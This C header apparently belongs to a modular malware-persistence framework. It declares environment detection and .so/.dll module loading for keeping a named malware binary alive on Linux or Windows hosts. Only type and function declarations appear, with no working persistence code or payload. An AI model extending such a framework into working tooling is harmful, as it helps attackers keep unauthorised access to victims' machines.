#ifndef _PERCISTENCY_HUB

#define _PERCISTENCY_HUB

#pragma region Configuration

	#ifdef __linux__
		#define                 TARGET_OPERAING_SYSTEM              LINUX
		#define                 MODULES_FOLDER                      "modules/linux"
		#define                 MODULE_EXTENSION                    ".so"
	#elif _WIN32
		#define                 TARGET_OPERAING_SYSTEM              WINDOWS
		#define                 MODULES_FOLDER                      "modules/windows"
		#define                 MODULE_EXTENSION                    ".dll"
	#else
		#error Platform not supported
	#endif

	#define                 MAX_MODULES                         32

#pragma endregion

#pragma region Enumerations

	typedef enum{
		WINDOWS = 0,
		LINUX = 1,
		OTHERS = 2
	} OPERATING_SYSTEM;

	typedef enum{
		X32 = 0,
		X64 = 1,
		UNKNOWN = 2
	} ARCHITECTURE;

	typedef enum{
		WITHOUT_ROOT = 0,
		WITH_ROOT = 1
	} ROOTED_STATE;

	typedef struct{
		OPERATING_SYSTEM operating_system;
		ARCHITECTURE architecture;
		ROOTED_STATE is_root;
		char *malware_path;
	} ENVIRONMENT;

	typedef struct{
		int count;
		char **names;
	} MODULE_WALLET;

#pragma 

#pragma region ExportedFunctions

	/**
	 * @brief Set the environment of the targetted machine and the used malware
	 * 
	 * @param env The environment object that will be setted
	 * @param os The operating system of the machine
	 * @param arch The architecture of the machine
	 * @param is_root True if the attacher has root on machine
	 * @param path_to_malware Path to the malware that need to gain persistency
	 * @return int Zero if success, non-zero if error
	 */
	int set_environment(ENVIRONMENT **env, OPERATING_SYSTEM os, ARCHITECTURE arch, ROOTED_STATE is_root, const char *path_to_malware);

	/**
	 * @brief Automatically set the machine details
	 * 
	 * @param env The environment object that will be setted
	 * @param path_to_malware Path to the malware that need to gain persistency
	 * @return int Zero if success, non-zero if error
	 */
	int autoset_environment(ENVIRONMENT **env, const char *path_to_malware);

	/**
	 * @brief Free the already setted environment
	 * 
	 * @param env The environment object that will be freed
	 * @return int Zero if success, non-zero if error
	 */
	int free_environment(ENVIRONMENT **env);

	/**
	 * @brief Get the all modules from the local setup
	 * 
	 * @param wallet Modules holder
	 * @return int Zero if success, non-zero if error
	 */
	int get_all_modules(MODULE_WALLET **wallet);

	/**
	 * @brief Free the already setted module wallet
	 * 
	 * @param wallet The module wallet that will be freed
	 * @return int Zero if success, non-zero if error
	 */
	int free_module_wallet(MODULE_WALLET **wallet);

#pragma endregion

#endif